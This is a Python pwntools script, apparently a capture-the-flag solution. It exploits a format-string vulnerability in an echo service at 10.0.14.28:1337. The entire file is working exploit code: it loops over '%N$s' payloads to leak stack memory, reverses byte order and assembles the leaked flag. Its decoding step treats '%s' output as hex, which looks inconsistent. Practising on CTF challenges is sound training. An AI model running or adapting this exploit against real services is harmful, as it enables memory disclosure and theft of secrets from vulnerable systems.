#!/usr/bin/python3
# Author: Hack.You
from pwn import *
import warnings

warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")
context.log_level = 'info'

flag = ''

for i in range(1, 100):
    try:
        io = remote('10.0.14.28', 1337, level='warn')
        io.recvuntil("Give me a word and i'll say it back at you...")
        io.sendline('%{}$s'.format(i).encode())
        io.recvlines(2)
        result = io.recvline()
        if not b'nil' in result:
            print(str(i) + ': ' + str(result))
            try:
                # Decode, reverse endianess and print
                decoded = unhex(result.strip().decode()[2:])
                reversed_hex = decoded[::-1]
                print(str(reversed_hex))
                # Build up flag
                flag += reversed_hex.decode()
            except BaseException:
                pass
        io.close()
    except EOFError:
        io.close()

# Print and close
info(flag)
with open('result.txt', 'w') as file:
    file.write(flag)
